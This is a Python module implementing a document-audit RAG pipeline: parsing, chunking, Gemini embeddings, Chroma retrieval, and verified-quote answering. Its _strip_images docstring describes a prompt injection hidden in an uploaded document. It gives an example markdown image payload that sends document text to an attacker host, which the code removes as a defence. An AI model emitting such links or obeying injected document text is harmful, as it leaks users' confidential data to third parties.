"""
The shared RAG pipeline - every page in the app builds on these stages.

Deliberately free of Streamlit imports so the whole pipeline can be exercised
from a plain script (see tests/test_rag.py). views/ is only the UI layer.

Pipeline stages, in order:
    parse_document   -> page-aware plain text
    chunk_pages      -> overlapping Documents carrying source+page metadata
    build_index      -> Gemini embeddings -> persistent Chroma collection
    retrieve         -> per-question similarity search with scores
    answer_question  -> grounded generation with a quote-verification guardrail
"""

from __future__ import annotations

import io
import logging
import os
import re
import tempfile
import unicodedata
from dataclasses import dataclass, field
from pathlib import Path

from langchain_core.documents import Document
from langchain_text_splitters import RecursiveCharacterTextSplitter

# ---------------------------------------------------------------------------
# 1. PARSING
# ---------------------------------------------------------------------------

# pypdf logs recoverable structural quirks ("EOF marker not found") at WARNING
# straight to stderr. They are noise for a malformed file we already handle and
# report ourselves, and in the Streamlit console they look like real errors.
logging.getLogger("pypdf").setLevel(logging.ERROR)

SUPPORTED_SUFFIXES = {".pdf", ".docx", ".txt", ".md"}


class UnsupportedFile(ValueError):
    """Raised for a file type we cannot parse."""


class NoExtractableText(ValueError):
    """
    Raised when a file parses but yields no text.

    The common cause is a scanned/image-only PDF with no text layer. Without
    this check the document would embed as zero chunks and every question
    would silently come back "not covered" — a wrong answer that looks like a
    real one. We fail loudly instead.
    """


def parse_document(data: bytes, filename: str) -> list[tuple[int | None, str]]:
    """
    Extract text from an uploaded file.

    Returns a list of (page_number, text) pairs. page_number is 1-indexed for
    PDFs and None for formats that have no intrinsic pagination (docx, txt),
    which is what lets an answer cite "p.12" for a PDF and omit the page
    otherwise.
    """
    suffix = Path(filename).suffix.lower()

    if suffix == ".pdf":
        pages = _parse_pdf(data)
    elif suffix == ".docx":
        pages = [(None, _parse_docx(data))]
    elif suffix in (".txt", ".md"):
        pages = [(None, data.decode("utf-8", errors="replace"))]
    else:
        raise UnsupportedFile(
            f"{filename}: unsupported type '{suffix or 'none'}'. "
            f"Supported: {', '.join(sorted(SUPPORTED_SUFFIXES))}"
        )

    pages = [(page, _normalise_whitespace(text)) for page, text in pages]
    pages = [(page, text) for page, text in pages if text and text.strip()]
    if not pages:
        raise NoExtractableText(
            f"{filename}: no text could be extracted. If this is a scanned "
            f"PDF it has no text layer — run OCR on it first, or upload a "
            f"text-based version."
        )
    return pages



def _normalise_whitespace(text: str) -> str:
    """
    Collapse PDF layout whitespace without destroying document structure.

    PDF text extraction carries the page's visual layout with it: columns and
    justified text become long runs of spaces, and a fixed character grid pads
    every line to the same width. Left alone that padding gets embedded along
    with the words, wasting tokens and diluting the semantic signal of the
    chunk. Paragraph breaks are preserved because the chunker splits on them.

    NFKC first: typeset PDFs store "fi"/"fl" as single ligature glyphs (the
    World Bank report has 1,559 of them). Left in, "conﬂict" and "conflict"
    are different strings to keyword search, the embedder and the quote
    check alike. NFKC also turns non-breaking spaces into plain ones.
    """
    text = unicodedata.normalize("NFKC", text)  # ligatures, nbsp, full-width
    text = re.sub(r"[ \t]{2,}", " ", text)      # runs of spaces/tabs -> one
    text = re.sub(r" *\n *", "\n", text)        # strip space around newlines
    text = re.sub(r"\n{3,}", "\n\n", text)      # 3+ blank lines -> paragraph gap
    return text.strip()


_BARE_PAGE_NUMBER = re.compile(r"^\s*(\d{1,4}|[ivxlc]{1,7})\s*$")


def _furniture_key(line: str) -> str:
    # Digits and spacing removed, so "3U.S. GOVERNMENT..." and the
    # letter-spaced "C H A PT ER 2 ... 74" on every page reduce to one key.
    return re.sub(r"[\d\s]+", "", line).lower()


def strip_page_furniture(
    pages: list[tuple[int | None, str]],
    min_share: float = 0.15,
    min_pages: int = 3,
) -> list[tuple[int | None, str]]:
    """
    Remove running headers, footers and bare page numbers.

    A line is furniture when (digits and spacing ignored) it appears on at
    least `min_share` of the pages. Left in, "U.S. GOVERNMENT PUBLISHING
    OFFICE | 2018 ANNUAL REPORT" is embedded into every chunk on 14 pages of
    the GPO report and pulls them all towards any question that mentions GPO.
    Short keys are kept: a table's year header ("2023 2024 2025e ...")
    repeats on every table page and is content, not furniture.
    """
    from collections import Counter

    counts = Counter(
        key for _, text in pages
        for key in {_furniture_key(line) for line in text.splitlines()} if key
    )
    threshold = max(min_pages, min_share * len(pages))
    furniture = {key for key, n in counts.items() if n >= threshold and len(key) >= 8}

    out = []
    for page, text in pages:
        kept = [
            line for line in text.splitlines()
            if _furniture_key(line) not in furniture and not _BARE_PAGE_NUMBER.match(line)
        ]
        cleaned = "\n".join(kept).strip()
        if cleaned:
            out.append((page, cleaned))
    return out


def _parse_pdf(data: bytes) -> list[tuple[int, str]]:
    from pypdf import PdfReader
    from pypdf.errors import DependencyError, PyPdfError

    try:
        reader = PdfReader(io.BytesIO(data))
        list(reader.pages)   # load the page tree here, so a corrupt file fails inside the try
    except (PyPdfError, DependencyError) as exc:
        # pypdf raises a family of low-level errors: PyPdfError is the base
        # for most (PdfStreamError, WrongPasswordError, EmptyFileError...) but
        # DependencyError sits outside that tree and is what an encrypted PDF
        # raises when crypto extras are missing — so both are caught. None of
        # them mean anything to a user staring at an upload box, so they all
        # collapse into one actionable message.
        raise UnsupportedFile(
            f"This PDF could not be read ({type(exc).__name__}). It may be "
            f"corrupt or password-protected."
        ) from exc

    out: list[tuple[int, str]] = []
    for i, page in enumerate(reader.pages, start=1):
        try:
            out.append((i, page.extract_text() or ""))
        except Exception:
            # One unreadable page should not sink an otherwise fine document.
            out.append((i, ""))
    return out


def _parse_docx(data: bytes) -> str:
    import zipfile

    import docx2txt

    # docx2txt only accepts a path, not bytes, so the upload has to touch disk.
    with tempfile.NamedTemporaryFile(suffix=".docx", delete=False) as tmp:
        tmp.write(data)
        tmp_path = tmp.name
    try:
        return docx2txt.process(tmp_path) or ""
    except (zipfile.BadZipFile, KeyError) as exc:
        # A corrupt file, or an old binary .doc renamed to .docx, is not a
        # zip / has no word/document.xml. Uncaught, it crashed the whole page
        # and took every other file in the upload batch down with it.
        raise UnsupportedFile(
            f"This .docx could not be read ({type(exc).__name__}). It may be "
            f"corrupt, or an old .doc file - re-save it as .docx."
        ) from exc
    finally:
        os.unlink(tmp_path)


# ---------------------------------------------------------------------------
# 2. CHUNKING
# ---------------------------------------------------------------------------

# Why 1000/150: in policy, security and contract documents a single
# requirement is usually a 1-3 sentence clause. ~1000 characters (~150 words)
# holds a full clause plus enough surrounding context for the model to judge
# it, while staying small enough that one embedding still represents one idea.
# The 150-char overlap stops a clause that straddles a boundary from being
# split across two chunks and retrieved as two useless halves.
CHUNK_SIZE = 1000
CHUNK_OVERLAP = 150


def chunk_pages(
    pages: list[tuple[int | None, str]],
    source: str,
    chunk_size: int = CHUNK_SIZE,
    chunk_overlap: int = CHUNK_OVERLAP,
) -> list[Document]:
    """
    Split parsed pages into overlapping, citable chunks.

    Splitting happens per page so a chunk never spans a page boundary — that
    keeps every chunk's page number unambiguous, which is what makes the
    citations in the final report trustworthy.
    """
    splitter = RecursiveCharacterTextSplitter(
        chunk_size=chunk_size,
        chunk_overlap=chunk_overlap,
        # Ordered coarse -> fine: prefer breaking at a paragraph, then a line,
        # then a sentence, and only split mid-word as a last resort.
        separators=["\n\n", "\n", ". ", " ", ""],
        length_function=len,
    )

    docs: list[Document] = []
    for page, text in pages:
        for piece in splitter.split_text(text):
            piece = piece.strip()
            if not piece:
                continue
            docs.append(
                Document(
                    page_content=piece,
                    metadata={
                        "source": source,
                        "page": page if page is not None else 0,
                        "chunk_index": len(docs),
                    },
                )
            )
    return docs


# ---------------------------------------------------------------------------
# 3. STRUCTURE-AWARE CHUNKING
# ---------------------------------------------------------------------------

# Policies, contracts and standards are written as numbered sections with
# SHOUTED headings ("5. LOGGING AND MONITORING"). A fixed-size splitter
# ignores that structure and produces chunks that straddle two topics: the
# chunk answering "how long are logs kept" opened with the password heading,
# which both blurs its embedding and makes the citation confusing to read.
#
# Matching only top-level ALL-CAPS headings is deliberate. Splitting on every
# numbered clause ("2.1 ...") too would shred the document into single
# sentences that retrieve without any surrounding context.
#
# [ \t], never \s: \s also matches newlines, so a page number on its own line
# glued itself to the next line ("19\nSECT" on the GPO report) and became a
# bogus heading.
_SECTION_HEADING = re.compile(
    r"^[ \t]*(\d+)\.?[ \t]+([A-Z][A-Z0-9 ,&/()'-]{3,})[ \t]*$",
    re.MULTILINE,
)


def split_into_sections(text: str) -> list[tuple[str | None, str]]:
    """
    Split a document at its top-level headings.

    Returns [(heading, body), ...]. Any preamble before the first heading is
    returned with heading None. A document with no detectable headings comes
    back as a single (None, text) entry, so callers need no special case.
    """
    matches = list(_SECTION_HEADING.finditer(text))
    if not matches:
        return [(None, text)]

    sections: list[tuple[str | None, str]] = []
    if matches[0].start() > 0:
        preamble = text[: matches[0].start()].strip()
        if preamble:
            sections.append((None, preamble))

    for i, m in enumerate(matches):
        heading = m.group(0).strip()
        end = matches[i + 1].start() if i + 1 < len(matches) else len(text)
        body = text[m.end() : end].strip()
        if body:
            sections.append((heading, body))
    return sections


def chunk_pages_structured(
    pages: list[tuple[int | None, str]],
    source: str,
    chunk_size: int = CHUNK_SIZE,
    chunk_overlap: int = CHUNK_OVERLAP,
) -> list[Document]:
    """
    Chunk on section boundaries, falling back to size-based splitting.

    A section that already fits becomes exactly one chunk - one topic, one
    embedding. An oversized section is split further, and every resulting
    piece is PREFIXED WITH ITS HEADING so a fragment of section 5 still
    carries "5. LOGGING AND MONITORING" into both the embedding and the
    citation. That prefix is why a mid-section fragment stays interpretable.
    """
    splitter = RecursiveCharacterTextSplitter(
        chunk_size=chunk_size,
        chunk_overlap=chunk_overlap,
        separators=["\n\n", "\n", ". ", " ", ""],
        length_function=len,
    )

    docs: list[Document] = []
    for page, text in pages:
        for heading, body in split_into_sections(text):
            prefix = f"{heading}\n" if heading else ""
            whole = f"{prefix}{body}"

            pieces = [whole] if len(whole) <= chunk_size else [
                # Re-prefix each piece; the splitter only sees the body.
                f"{prefix}{piece}" for piece in splitter.split_text(body)
            ]
            for piece in pieces:
                piece = piece.strip()
                if not piece:
                    continue
                docs.append(
                    Document(
                        page_content=piece,
                        metadata={
                            "source": source,
                            "page": page if page is not None else 0,
                            "section": heading or "",
                            "chunk_index": len(docs),
                        },
                    )
                )
    return docs


# ---------------------------------------------------------------------------
# 4. RESULT TYPES
# ---------------------------------------------------------------------------

# Verdicts, worst-to-best. The whole point of the app is the NOT_FOUND row, so
# it is a first-class verdict rather than an error case.
COVERED = "COVERED"
PARTIAL = "PARTIAL"
NOT_FOUND = "NOT_FOUND"
# The question could not be processed at all (API down, quota exhausted).
# Deliberately NOT a NOT_FOUND: that would tell the user "your documents don't
# answer this" when the documents were never checked.
ERROR = "ERROR"


@dataclass
class Citation:
    source: str
    page: int          # 0 means "document has no pages" (docx/txt)
    quote: str         # verbatim span from the chunk, verified to exist
    # A DISTANCE, not a similarity score: LOWER means a closer match.
    # Chroma's method is named "..._with_relevance_scores" but returns raw
    # distances (L2 by default), so anything that sorts or thresholds on this
    # must not assume the usual higher-is-better convention.
    distance: float
    section: str = ""       # where in the document's structure, if known
    printed_page: str = ""  # the number printed on the page, if it differs

    def label(self) -> str:
        label = f"{self.source}, p.{self.page}" if self.page else self.source
        if self.printed_page and self.printed_page != str(self.page):
            label += f" (printed {self.printed_page})"
        return f"{label} · {self.section}" if self.section else label


def context_label(meta: dict) -> str:
    """The bracketed label a chunk carries into the prompt: source, page, section."""
    return Citation(
        source=meta.get("source", "?"),
        page=int(meta.get("page") or 0),
        quote="",
        distance=0.0,
        section=meta.get("section", ""),
        printed_page=str(meta.get("printed_page", "")),
    ).label()


@dataclass
class Finding:
    question: str
    verdict: str                              # COVERED | PARTIAL | NOT_FOUND | ERROR
    answer: str
    citations: list[Citation] = field(default_factory=list)
    note: str = ""                            # why a verdict was downgraded

    @property
    def icon(self) -> str:
        return {COVERED: "✅", PARTIAL: "⚠️", NOT_FOUND: "❌", ERROR: "🛑"}[self.verdict]


# ---------------------------------------------------------------------------
# 5. MODEL PLUMBING
# ---------------------------------------------------------------------------

# Preference order, best-first. Resolved against the live model list for the
# caller's key rather than hardcoded, because model availability differs by
# key, region and time — the workshop notebook's hardcoded names are already
# a generation out of date.
CHAT_PREFERENCE = [
    "gemini-3.1-flash-lite",   # measured ~5x faster than 3.x flash on this task
    "gemini-3.5-flash-lite",
    "gemini-flash-lite-latest",
    "gemini-2.5-flash-lite",
    "gemini-3.8-flash",
    "gemini-3.5-flash",
    "gemini-2.5-flash",
    "gemini-flash-latest",
]
# The GA model first: on the free tier gemini-embedding-2 ran out of daily
# quota after a few hundred texts (every text in a batch counts as a request),
# which broke indexing for the whole day.
EMBED_PREFERENCE = [
    "gemini-embedding-001",
    "gemini-embedding-2",
]


def get_text(response) -> str:
    """
    Return the plain text of a LangChain response.

    Gemini through LangChain sets `.content` to either a string or a list of
    content blocks (text plus internal metadata blocks). Indexing `.content`
    directly as a string silently yields garbage like
    "[{'type': 'text', ...}]" — which is exactly the sort of thing that then
    gets embedded or shown to a user.
    """
    content = response.content
    if isinstance(content, str):
        return content
    if isinstance(content, list):
        return "".join(
            block.get("text", "")
            for block in content
            if isinstance(block, dict) and block.get("type") == "text"
        )
    return str(content)


def list_available_models(api_key: str) -> tuple[list[str], list[str]]:
    """Return (generation_models, embedding_models) reachable with this key."""
    from google import genai

    client = genai.Client(api_key=api_key)
    gen: list[str] = []
    emb: list[str] = []
    for m in client.models.list():
        actions = set(getattr(m, "supported_actions", None) or [])
        name = m.name.replace("models/", "")
        if "generateContent" in actions:
            gen.append(name)
        if "embedContent" in actions:
            emb.append(name)
    return gen, emb


def resolve_models(api_key: str) -> tuple[str, str]:
    """
    Pick the best available (chat_model, embed_model) for this key.

    Raises RuntimeError with an actionable message if the key can reach no
    usable model, which is a far better failure than a 404 on first query.
    """
    gen, emb = list_available_models(api_key)
    # GEMINI_CHAT_MODEL pins the answer model - for an evaluation that must
    # score every variant with ONE model, or when the preferred model's daily
    # free quota (500 requests for gemini-3.1-flash-lite) is spent.
    pinned = os.environ.get("GEMINI_CHAT_MODEL", "").strip()
    chat = pinned if pinned in gen else next((m for m in CHAT_PREFERENCE if m in gen), None)
    embed = next((m for m in EMBED_PREFERENCE if m in emb), None)
    if not chat:
        raise RuntimeError(
            f"None of the supported chat models are available to this key. "
            f"Key can reach: {', '.join(sorted(gen)[:10]) or 'nothing'}"
        )
    if not embed:
        raise RuntimeError(
            f"No embedding model available to this key. "
            f"Key can reach: {', '.join(sorted(emb)) or 'nothing'}"
        )
    return chat, embed


# ---------------------------------------------------------------------------
# 6. RETRY ON TRANSIENT ERRORS
# ---------------------------------------------------------------------------

# Rate limits (429) on free-tier keys, plus Gemini's frequent 503 "model is
# overloaded". Both clear up on their own; anything else is a real error and
# is raised immediately.
_TRANSIENT_MARKERS = ("429", "resource_exhausted", "resourceexhausted",
                      "quota", "rate limit", "too many requests",
                      "503", "unavailable", "overloaded")


def with_retry(fn, attempts: int = 4, base_delay: float = 2.0):
    """Retry a call through transient API errors with exponential backoff."""
    import time

    for attempt in range(attempts):
        try:
            return fn()
        except Exception as exc:
            message = f"{type(exc).__name__} {exc}".lower()
            # A DAILY quota ("...PerDayPerProjectPerModel...") is also a 429,
            # but waiting seconds cannot clear it - fail now so the caller can
            # fall back to another model instead of burning the retries.
            transient = any(m in message for m in _TRANSIENT_MARKERS) and "perday" not in message
            if not transient or attempt == attempts - 1:
                raise
            time.sleep(base_delay * (2 ** attempt))
    raise RuntimeError("unreachable")


# ---------------------------------------------------------------------------
# 7. EMBEDDING + VECTOR STORAGE
# ---------------------------------------------------------------------------

# Gemini's embedding models are ASYMMETRIC: they accept a task_type telling
# them whether the text being embedded is a stored document or a search query,
# and place the two in the vector space accordingly. A question and the clause
# answering it are not phrased alike ("How long are logs retained?" vs "Logs
# are retained for 12 months"), so embedding both as if they were the same
# kind of text measurably weakens retrieval. Indexing uses RETRIEVAL_DOCUMENT;
# queries use RETRIEVAL_QUERY.
TASK_DOCUMENT = "RETRIEVAL_DOCUMENT"
TASK_QUERY = "RETRIEVAL_QUERY"


def make_embeddings(embed_model: str, task_type: str, api_key: str | None = None):
    from langchain_google_genai import GoogleGenerativeAIEmbeddings

    kwargs = {"model": f"models/{embed_model}", "task_type": task_type}
    if api_key:
        kwargs["google_api_key"] = api_key
    return GoogleGenerativeAIEmbeddings(**kwargs)


def build_index(
    docs: list[Document],
    embed_model: str,
    persist_directory: str = ".chroma",
    collection_name: str = "knowledge_base",
    api_key: str | None = None,
    reset: bool = True,
):
    """
    Embed chunks and store them in a persistent Chroma collection.

    reset=True drops any existing collection first. Without it, re-uploading
    the same document appends a second copy of every chunk, and duplicate
    chunks then crowd out other documents in the top-k — a silent retrieval
    regression that looks like a model problem.
    """
    from langchain_chroma import Chroma

    from datetime import datetime, timezone

    store = Chroma(
        collection_name=collection_name,
        embedding_function=make_embeddings(embed_model, TASK_DOCUMENT, api_key),
        persist_directory=persist_directory,
        # Stamped so abandoned collections can be pruned later. Without a
        # timestamp there is no way to tell a live session's collection from
        # one whose browser tab closed a week ago.
        collection_metadata={"created_at": datetime.now(timezone.utc).isoformat()},
    )
    if reset:
        store.reset_collection()
    if docs:
        # Embedding a batch of chunks is a burst of API calls and is the most
        # rate-limit-prone step in the whole pipeline on a free-tier key.
        # Unretried it surfaces as a bare "Indexing failed" and the user loses
        # the whole upload - which is exactly how this was found: as a
        # flaky test that failed only on longer runs.
        with_retry(lambda: store.add_documents(docs))
    return store


def open_index(
    embed_model: str,
    collection_name: str,
    persist_directory: str = ".chroma",
    api_key: str | None = None,
):
    """
    Reopen an existing on-disk collection WITHOUT re-embedding anything.

    This is what makes a browser reload cheap: the vectors are already on
    disk, so recovering a session costs one collection open instead of
    re-embedding every chunk and spending API quota again.
    """
    from langchain_chroma import Chroma

    return Chroma(
        collection_name=collection_name,
        embedding_function=make_embeddings(embed_model, TASK_DOCUMENT, api_key),
        persist_directory=persist_directory,
    )


def collection_summary(store) -> list[tuple[str, int]]:
    """
    Per-document chunk counts for an existing collection.

    Used to rebuild the "what is indexed" sidebar after a reload, when the
    file list is long gone but the chunks and their metadata are not.
    """
    try:
        data = store.get(include=["metadatas"])
    except Exception:
        return []
    counts: dict[str, int] = {}
    for meta in data.get("metadatas") or []:
        source = (meta or {}).get("source", "?")
        counts[source] = counts.get(source, 0) + 1
    return sorted(counts.items())


def prune_collections(
    persist_directory: str = ".chroma",
    max_age_hours: float = 24.0,
    keep: str | None = None,
) -> int:
    """
    Delete collections whose session is long gone. Returns the number removed.

    Every abandoned browser tab leaves a collection holding the text of
    whatever that user uploaded. Unpruned they accumulate indefinitely -
    unbounded disk growth, and confidential documents sitting on the server
    forever. `keep` is never deleted regardless of age.

    A collection with no readable timestamp is treated as old: it predates
    this stamping, so it cannot belong to a live session.
    """
    from datetime import datetime, timedelta, timezone

    import chromadb

    if not os.path.isdir(persist_directory):
        return 0

    try:
        client = chromadb.PersistentClient(path=persist_directory)
        collections = client.list_collections()
    except Exception:
        return 0

    cutoff = datetime.now(timezone.utc) - timedelta(hours=max_age_hours)
    removed = 0
    for collection in collections:
        if collection.name == keep:
            continue
        stamp = (collection.metadata or {}).get("created_at")
        try:
            created = datetime.fromisoformat(stamp) if stamp else None
        except (TypeError, ValueError):
            created = None
        if created is None or created < cutoff:
            try:
                client.delete_collection(collection.name)
                removed += 1
            except Exception:
                pass
    return removed


# ---------------------------------------------------------------------------
# 8. RETRIEVAL
# ---------------------------------------------------------------------------

TOP_K = 5


def retrieve(
    store,
    question: str,
    embed_model: str,
    k: int = TOP_K,
    api_key: str | None = None,
) -> list[tuple[Document, float]]:
    """
    Find the k chunks most relevant to one question.

    The query is embedded separately (RETRIEVAL_QUERY) rather than reusing the
    store's document embedder, then matched by vector. Despite the method's
    name, the scores are Chroma DISTANCES: lower is more similar.
    """
    # Retried here rather than only in run_audit, so the chat path and any
    # direct caller get the same protection.
    query_vec = with_retry(
        lambda: make_embeddings(embed_model, TASK_QUERY, api_key).embed_query(question)
    )
    return store.similarity_search_by_vector_with_relevance_scores(query_vec, k=k)


# ---------------------------------------------------------------------------
# 9. GROUNDED GENERATION + THE QUOTE-VERIFICATION GUARDRAIL
# ---------------------------------------------------------------------------

AUDIT_PROMPT = """You are auditing a set of documents to decide whether they \
answer one specific question.

Use ONLY the numbered context below. You have no other knowledge. If the \
context does not answer the question, that is a valid and useful result — say \
so rather than filling the gap.

Reply with ONLY a JSON object, no prose and no code fence:
{{
  "verdict": "COVERED" | "PARTIAL" | "NOT_FOUND",
  "answer": "<a concise answer, at most 2 sentences. Empty string if NOT_FOUND>",
  "quotes": ["<a span copied character-for-character from the context>"]
}}

Rules:
- COVERED   - the context fully and unambiguously answers the question.
- PARTIAL   - the context directly addresses the SUBJECT of the question but \
leaves a material part of it unestablished. This is the correct verdict \
whenever the documents evidence the thing asked about but not a qualifier \
attached to it - frequency, scope, a figure, or a certification status. \
Example: asked "is penetration testing performed at least annually?" where \
the context proves one test took place in March but says nothing about an \
annual cadence, the answer is PARTIAL - state what IS evidenced and what is \
not. Do not fall through to NOT_FOUND when you hold real partial evidence: a \
reviewer needs to know it exists.
- NOT_FOUND - the context says nothing about the subject of the question.
- Every quote MUST be copied character-for-character from the context above. \
Never paraphrase, summarise, correct or reformat a quote.
- A verdict of COVERED or PARTIAL REQUIRES at least one verbatim quote. If you \
cannot produce one, the verdict is NOT_FOUND.
- Every number in your answer must appear inside one of your quotes. Quote \
each sentence you take a figure from.
- Do not infer an answer from a related topic. "We encrypt in transit" does \
not answer a question about encryption at rest.

Context:
{context}

Question: {question}
"""


# Characters a model "helpfully" swaps when it copies a quote - curly quotes
# and apostrophes, en/em dashes. Same quote, different bytes; without folding
# a genuine quote fails the check and a covered question reads as a gap.
_QUOTE_FOLD = str.maketrans({
    "‘": "'", "’": "'", "“": '"', "”": '"',
    "–": "-", "—": "-",
})


def _normalise_for_match(text: str) -> str:
    """Fold away the differences a model harmlessly introduces when quoting."""
    text = unicodedata.normalize("NFKC", text).translate(_QUOTE_FOLD)
    return re.sub(r"\s+", " ", text).strip().lower()


_NUMBER = re.compile(r"\d[\d,]*(?:\.\d+)?")


_YEAR_RANGE = re.compile(r"\b(\d{2})(\d{2})\s*[-–/]\s*(\d{2})\b")


def _numbers(text: str) -> set[str]:
    """
    Every number in the text, with thousands separators dropped.

    "2027-28" also yields 2028, so an answer that writes the range out in
    full ("2027-2028") is not mistaken for an invented figure.
    """
    found = {n.replace(",", "") for n in _NUMBER.findall(text)}
    found |= {century + end for century, _, end in _YEAR_RANGE.findall(text)}
    return found


_MD_IMAGE = re.compile(r"!\[[^\]]*\]\([^)]*\)")


def _strip_images(text: str) -> str:
    """
    Remove markdown images from model output.

    The UI renders answers as markdown, and an image loads the moment it
    renders. A prompt injection hidden in an uploaded document or a client's
    questionnaire could make the model emit ![](https://attacker/?d=<text>),
    and the browser would send that text away without anyone clicking.
    """
    return _MD_IMAGE.sub("", text)


def _extract_json(raw: str) -> dict:
    """
    Pull a JSON object out of a model reply.

    Models wrap JSON in ```json fences, add a preamble, or both, despite being
    told not to. Slicing from the first '{' to the last '}' survives all of it.
    """
    import json

    start, end = raw.find("{"), raw.rfind("}")
    if start == -1 or end == -1 or end < start:
        raise ValueError(f"no JSON object in model reply: {raw[:200]!r}")
    return json.loads(raw[start : end + 1])


REPAIR_PROMPT = """

Your previous reply was rejected by an automatic check: {problem}
Reply again in the same JSON format. Copy every quote character-for-character \
from one passage, quote every passage (sentence or table row) that a number in \
your answer comes from - or leave that number out - and report figures exactly \
as printed."""


def answer_question(
    llm,
    question: str,
    hits: list[tuple[Document, float]],
    prompt: str = AUDIT_PROMPT,
    repair: bool = False,
) -> Finding:
    """
    Answer one question from retrieved chunks, then VERIFY the answer.

    This is the guardrail, and the reason the app can be trusted. The model is
    required to support any claim of coverage with a verbatim quote, and every
    quote is then checked in code against the retrieved text. A quote the model
    invented, paraphrased, or pulled from its own knowledge will not be found,
    and the verdict is forcibly downgraded to NOT_FOUND.

    So "COVERED" never means "the model said so" - it means the supporting
    sentence was located in the user's own document. Prompt instructions alone
    are a request; this is a check.

    A real quote can still sit beside an invented answer ("7 years" next to a
    verified "retained for 12 months"), so every number the answer states must
    also appear in a passage it verifiably quoted from, or in the question.
    The passage, not just the quote: a table cell's meaning lives in its
    header ("iMac (two ports) 256GB"), which a model rarely quotes even when
    told to, and a number that sits in the quoted passage is in the document
    right beside the evidence.

    repair=True gives a rejected reply ONE second chance: the model is told
    exactly why it was rejected and answers again, and the new reply goes
    through the same checks. The check never relaxes; the model gets the
    feedback a human reviewer would give. One extra call, only on rejection.
    """
    if not hits:
        return Finding(
            question=question,
            verdict=NOT_FOUND,
            answer="",
            note="No chunks retrieved - is the knowledge base empty?",
        )

    context = "\n\n".join(
        f"[{i}] ({context_label(doc.metadata)})\n{doc.page_content}"
        for i, (doc, _) in enumerate(hits, start=1)
    )

    full_prompt = prompt.format(context=context, question=question)
    finding = _verify(get_text(llm.invoke(full_prompt)), question, hits)
    rejected = finding.note.startswith(("Downgraded", "Could not parse"))
    if not (repair and rejected):
        return finding

    second = _verify(
        get_text(llm.invoke(full_prompt + REPAIR_PROMPT.format(problem=finding.note))),
        question, hits,
    )
    if second.verdict in (COVERED, PARTIAL):
        second.note = f"Passed on a second attempt; the first reply was rejected - {finding.note} {second.note}".strip()
    else:
        second.note = f"{second.note} (after one repair attempt)".strip()
    return second


def _verify(raw: str, question: str, hits: list[tuple[Document, float]]) -> Finding:
    """Parse a model reply and hold it to the quote and number checks."""
    try:
        payload = _extract_json(raw)
    except Exception as exc:
        # A malformed reply must never be reported as coverage.
        return Finding(
            question=question,
            verdict=NOT_FOUND,
            answer="",
            note=f"Could not parse the model reply ({exc}).",
        )

    verdict = str(payload.get("verdict", "")).strip().upper()
    if verdict not in (COVERED, PARTIAL, NOT_FOUND):
        verdict = NOT_FOUND
    answer = _strip_images(str(payload.get("answer", ""))).strip()
    claimed = payload.get("quotes") or []
    if isinstance(claimed, str):
        claimed = [claimed]

    # --- verification: every claimed quote must exist in a retrieved chunk ---
    citations: list[Citation] = []
    cited_passages: list[str] = []
    unverified: list[str] = []
    for quote in claimed:
        quote = str(quote).strip()
        if len(quote) < 10:          # too short to be evidence of anything
            continue
        needle = _normalise_for_match(quote)
        for doc, distance in hits:
            if needle in _normalise_for_match(doc.page_content):
                citations.append(
                    Citation(
                        source=doc.metadata.get("source", "?"),
                        page=int(doc.metadata.get("page") or 0),
                        quote=quote,
                        distance=float(distance),
                        section=doc.metadata.get("section", ""),
                        printed_page=str(doc.metadata.get("printed_page", "")),
                    )
                )
                cited_passages.append(doc.page_content)
                break
        else:
            unverified.append(quote)

    note = ""
    unsupported = sorted(
        _numbers(answer) - _numbers(" ".join(cited_passages) + " " + question)
    )
    if verdict in (COVERED, PARTIAL) and not citations:
        note = (
            "Downgraded to NOT_FOUND: the model claimed coverage but no "
            "supporting quote could be found in the retrieved text"
            + (f" ({len(unverified)} quote(s) did not match)." if unverified else ".")
        )
        verdict, answer = NOT_FOUND, ""
    elif verdict in (COVERED, PARTIAL) and unsupported:
        # Citations are kept: they show the reviewer what WAS found.
        note = (
            f"Downgraded to NOT_FOUND: the answer states {', '.join(unsupported)}, "
            f"which appears in none of the passages it quoted."
        )
        verdict, answer = NOT_FOUND, ""
    elif unverified:
        note = f"{len(unverified)} unverified quote(s) discarded."

    return Finding(
        question=question,
        verdict=verdict,
        answer=answer,
        citations=citations,
        note=note,
    )


# ---------------------------------------------------------------------------
# 10. CONVERSATIONAL MODE
# ---------------------------------------------------------------------------

CHAT_PROMPT = """You are a document assistant. Answer the user's question \
using ONLY the context below, which was retrieved from documents the user \
uploaded.

If the context does not contain the answer, say plainly that the documents do \
not cover it. Never fill a gap with general knowledge - the user is relying on \
you to distinguish what their documents say from what is merely true.

Cite the source of each fact inline, copying the bracketed label EXACTLY as \
it appears above that chunk in the context - for example [policy.pdf, p.4] or \
[policy.txt]. Never add, invent or adjust a page number: a label shown without \
a page has no page, because that document format has none.

{history_block}Context:
{context}

Question: {question}

Answer:"""


def chat_answer(
    llm,
    question: str,
    hits: list[tuple[Document, float]],
    history: list[tuple[str, str]] | None = None,
    history_turns: int = 4,
) -> tuple[str, list[Citation]]:
    """
    Answer a follow-up question conversationally, with sources.

    Returns (answer_text, citations). Unlike answer_question() this does not
    force a verdict or hard-verify quotes - a conversation needs to be able to
    say "your documents cover X but not Y". The grounding instruction and the
    retrieved-only context still apply, and the citations returned are the
    chunks actually retrieved, so every answer remains traceable.

    Only the last `history_turns` exchanges are resent: enough for "and what
    about the other one?" to resolve, without the prompt growing without bound
    as the conversation goes on.
    """
    if not hits:
        return ("I could not find anything relevant in the uploaded documents.", [])

    context = "\n\n".join(
        f"[{doc.metadata.get('source', '?')}"
        + (f", p.{doc.metadata['page']}" if doc.metadata.get("page") else "")
        + f"]\n{doc.page_content}"
        for doc, _ in hits
    )

    history_block = ""
    if history:
        recent = history[-history_turns:]
        transcript = "\n".join(f"User: {u}\nAssistant: {a}" for u, a in recent)
        history_block = f"Conversation so far:\n{transcript}\n\n"

    answer = _strip_images(get_text(
        llm.invoke(
            CHAT_PROMPT.format(
                history_block=history_block, context=context, question=question
            )
        )
    )).strip()

    citations = [
        Citation(
            source=doc.metadata.get("source", "?"),
            page=int(doc.metadata.get("page") or 0),
            quote=doc.page_content[:300],
            distance=float(distance),
        )
        for doc, distance in hits
    ]
    return answer, citations
